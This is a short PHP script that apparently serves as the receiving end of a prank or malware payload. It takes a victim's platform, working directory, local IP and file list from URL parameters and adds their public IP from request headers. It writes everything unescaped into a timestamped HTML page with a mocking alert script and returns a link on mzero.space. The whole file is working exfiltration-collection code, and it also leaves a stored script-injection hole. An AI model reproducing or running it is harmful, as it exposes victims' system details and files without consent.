<?php
$plat = $_GET["plat"];
$cwd = $_GET["cwd"];
$ip = $_GET["ip"];
$files = $_GET["files"];
function getRealIpAddr()
{
    if (!empty($_SERVER['HTTP_CLIENT_IP']))   //check ip from share internet
    {
      $ip=$_SERVER['HTTP_CLIENT_IP'];
    }
    elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))   //to check ip is pass from proxy
    {
      $ip=$_SERVER['HTTP_X_FORWARDED_FOR'];
    }
    else
    {
      $ip=$_SERVER['REMOTE_ADDR'];
    }
    return $ip;
}
$pip = getRealIpAddr();
$files = str_replace("XXXXXXX","<br>",$files);
$page = "PLATFORM: ".$plat." <br>PUBLIC IP: ".$pip." <br>LOCAL IP: ".$ip." <br>CWD: ".$cwd." <br>FILES: ".$files;
$page .= "<script>alert('CONGRATS, YOU ARE DUMB AS FUCK!');</script>";
//echo $page;
$t=time();
echo "http://mzero.space/lab/x/".$t.".html";
$myfile = fopen($t.".html", "w") or die("Unable to open file!");
fwrite($myfile, $page);
